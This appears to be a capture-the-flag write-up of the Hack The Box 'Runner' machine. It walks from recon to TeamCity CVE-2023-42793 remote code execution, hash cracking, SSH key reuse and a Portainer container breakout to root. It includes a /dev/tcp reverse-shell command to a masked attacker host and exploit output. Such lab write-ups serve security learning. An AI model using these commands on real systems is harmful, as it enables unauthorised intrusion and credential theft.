![Runner](https://github.com/amalcew/htb-writeups/assets/73908014/18de41ab-245c-4127-ab71-4f6bb2608925)

## Reconnaissance & port scanning

Let's start with port scan

```bash
# Nmap 7.94SVN scan initiated Fri May 24 17:36:34 2024 as: nmap -sV -sC --open -oA logs/initial_recon/initial 10.10.11.13
Nmap scan report for runner.htb (10.10.11.13)
Host is up (0.025s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Runner - CI/CD Specialists
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 24 17:36:42 2024 -- 1 IP address (1 host up) scanned in 7.83 seconds
```

Heading to the website hosted on port 80, we can see simple webpage:

![01-initial_webpage](https://github.com/amalcew/htb-writeups/assets/73908014/8c6d8f32-5941-4337-939f-6449c6d9f380)

Enumerating the machine did not return any significant directories or any vhosts, when enumerating the machine with [SecLists](https://github.com/danielmiessler/SecLists). As there are no inputs that can be exploited, I've started exploring the webpage content.

![02-cicd_disclosed](https://github.com/amalcew/htb-writeups/assets/73908014/22929417-d005-49d3-a831-15077fb4be1c)

The webpage apperantly is disclosing the service that is running on the machine. As there were no signs of any CI\CD panels, I've returned to vhost enumeration. This time, using [n0kovo_subdomains](https://github.com/n0kovo/n0kovo_subdomains/tree/main), which could has possible CI\CD subdomains.

```bash
> ffuf -w /usr/share/wordlists/n0kovo_subdomains/n0kovo_subdomains_huge.txt:FUZZ -u http://runner.htb/ -H 'Host: FUZZ.runner.htb' | grep -iv 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/n0kovo_subdomains/n0kovo_subdomains_huge.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 29ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

Bingo! After adding the subdomain to the `/etc/hosts`, We are greeted with TeamCity's login page:

![03-teamcity](https://github.com/amalcew/htb-writeups/assets/73908014/3036f00b-c7f8-4759-a87b-661523f6592f)

The login page already discloses which version of the service is running on the server. Quick search reveals, that this version of TeamCity is vulnerable to CVE-2023-42793.


## Initial foothold

### Authentication bypass & RCE

As previously discovered, the TeamCity panel is vulnerable to [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793), which can lead to remote code execution.

After quick search I've found an [exploit PoC](https://github.com/Zyad-Elsayed/CVE-2023-42793). The authentication bypass created a admin user on the server:

```bash
> python exploit.py -u http://teamcity.runner.htb 

=====================================================
*                                                   *
*              CVE-2023-42793                       *
*        TeamCity Admin Account Creation            *
*                                                   *
=====================================================

Token: eyJ0***************************************************************************************************Dlj
Token saved to ./token
Successfully exploited!
URL: http://teamcity.runner.htb
Username: admin.H4sy
Password: P**************3
```

And allowed me to log into the panel with admin privileges:

![04-admin_panel](https://github.com/amalcew/htb-writeups/assets/73908014/3739e54b-be11-417b-9241-ab6de1bae4a8)

As the admin panel was empty and had no clues regarding initial foothold on the server, I've continued to the second part of the exploit which was utilizing the user token to execute the command on the server:

```bash
> python rce.py -u http://teamcity.runner.htb -t token -c 'id'    
StdOut:uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)

StdErr: 
Exit code: 0
Time: 25ms  
```

This quick check confirms, that the target is indeed vulnerable. This way we can spawn our reverse shell

```bash
> python rce.py -u http://teamcity.runner.htb -t token -c '"/bin/bash"&params="-c"&params="sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxx.xx.xx.xx%2F1234%200%3E%261"'
```

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.13] 50768
sh: 0: can't access tty; job control turned off
$ id
uid=1000(tcuser) gid=1000(tcuser) groups=1000(tcuser)
```

### Scanning and discovering the rsa key

As I've discovered, the environment where I've landed was a Docker container. 

```bash
tcuser@647a82f29ca0:~/bin$ ls /home
tcuser@647a82f29ca0:~/bin$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
tcuser@647a82f29ca0:~/bin$ find / -name .dockerenv 2>/dev/null
/.dockerenv
```

This is quite troubling, as we will need to break out of the container to access the host underneath. After some manual exploration I've discovered the TeamCity `datadir` folder containing many potential valuable findings:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir$ ls
backup                      backup_20240524_154255.zip
backup_20240524_102038.zip  backup_20240524_154642.zip
backup_20240524_102050.zip  backup_20240524_154724.zip
backup_20240524_102253.zip  backup_20240524_154725.zip
backup_20240524_102306.zip  backup_20240524_154813.zip
backup_20240524_153623.zip  config
backup_20240524_153638.zip  lib
backup_20240524_153730.zip  plugins
backup_20240524_153815.zip  system
backup_20240524_154149.zip
```

First finding was hashes of two machine users, stored inside server logs that looked like automated building script:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir/system$ cat buildserver.log

... SNIP ...
INSERT INTO USERS VALUES(2,'matthew','$2a************************************************Em','Matthew','matthew@runner.htb',1716567667703,'BCRYPT')
... SNIP ...
INSERT INTO USERS VALUES(1,'admin','$2a************************************************ye','John','john@runner.htb',1716565938693,'BCRYPT')
... SNIP ...

```

User `matthew`'s hash was crackable:

```bash
> john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 128 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
p******3         (?)     
Session aborted

```

As we obtained the password, I've tried to ssh into the machine with no luck, so I've returned to exploration of the `datadir` folder

The real treasure hidden inside the directory was `id_rsa` private key of on of the box's users:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir$ find . -name id_rsa
./config/projects/AllProjects/pluginData/ssh_keys/id_rsa
```

After copyting to my machine I've been able to log into the machine as user `john` and read user flag:

```bash
ssh -i id_rsa john@10.10.11.13 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-102-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Fri May 24 06:54:08 PM UTC 2024

  System load:  0.3037109375      Users logged in:                  0
  Usage of /:   82.8% of 9.74GB   IPv4 address for br-21746deff6ac: 172.18.0.1
  Memory usage: 46%               IPv4 address for docker0:         172.17.0.1
  Swap usage:   0%                IPv4 address for eth0:            10.10.11.13
  Processes:    234


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri May 24 17:10:29 2024 from xx.xx.xx.xx
john@runner:~$ cat user.txt 
31****************************6c
```

## Privileges escalation

### Hidden service

After landing into the machine, I've started to enumerate it. The machine has some interesting secres, some open ports:

```bash
john@runner:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:9443          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8111          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5005          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8000                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

And enigmatic directory `/data` inside root directory, owned by root user:

```bash
john@runner:~$ ls /
bin   data  etc   lib    lib64   lost+found  mnt  proc  run   srv  tmp  var
boot  dev   home  lib32  libx32  media       opt  root  sbin  sys  usr
john@runner:~$ ls -al /data
total 132
drwxr-xr-x  9 root root   4096 Feb 28 10:31 .
drwxr-xr-x 19 root root   4096 Apr  4 10:24 ..
drwx------  2 root root   4096 Feb 28 07:51 bin
drwx------  2 root root   4096 Feb 28 07:51 certs
drwx------  2 root root   4096 Feb 28 07:51 chisel
drwx------  2 root root   4096 Feb 28 07:51 compose
drwx------  2 root root   4096 Feb 28 07:51 docker_config
-rw-------  1 root root 131072 May 24 18:56 portainer.db
-rw-------  1 root root    227 Feb 28 07:51 portainer.key
-rw-------  1 root root    190 Feb 28 07:51 portainer.pub
drwxr-xr-x  4 root root   4096 Feb 28 10:31 teamcity_server
drwx------  2 root root   4096 Feb 28 07:51 tls
```

This directory points to one of the container services, called `portainer`. The service allows user for easy management of the containers and utilizes port `9443`.

After forwarding the port to our machine and opening the browser on `localhost:9443` we are greeted with Portainer's login page:

![05-portainer](https://github.com/amalcew/htb-writeups/assets/73908014/74083bf7-1f8c-4b6b-a0cd-7ed6ba5da2fa)

Using cracked credentials for user `matthew` we can access the admin panel:

![06-portainer_panel](https://github.com/amalcew/htb-writeups/assets/73908014/ee7a66f0-2325-4bf6-94cc-4d0f8c0f4434)

### Docker breakout

Durin research of the Portainer service, I've found interesting [PoC for escalating privileges](https://rioasmara.com/2021/08/15/use-portainer-for-privilege-escalation/). As the described method used older version of Portainer, breaking out of this instance required some additional steps.

First, I've created a shared volume that pointed to host's root directory: 

![image](https://github.com/amalcew/htb-writeups/assets/73908014/21a052df-28fa-4462-86eb-30645ee42a09)

After grabbing one of the existing images ID:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/8a6b543d-51e3-4e9b-bca9-2ed7926afa35)

I've created new container with connected volume and interactive tty session. It was also required, that the container's user was set to `root`:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/9236c6bf-7a5b-432f-a85c-cb2804298042)

![image](https://github.com/amalcew/htb-writeups/assets/73908014/09b3e13b-c262-4923-90a0-87c59f6f5c5a)

After creating the container, I've headed to container's console:

![image](https://github.com/amalcew/htb-writeups/assets/73908014/e0abbd84-ade5-43b2-9e04-bdcb09bcbd01)

This way I've been able to gain access to root on the host machine and exfiltrate the system flag:

![07-docker_breakout](https://github.com/amalcew/htb-writeups/assets/73908014/abc2acc9-e137-4bc3-bc7b-3849347b175b)



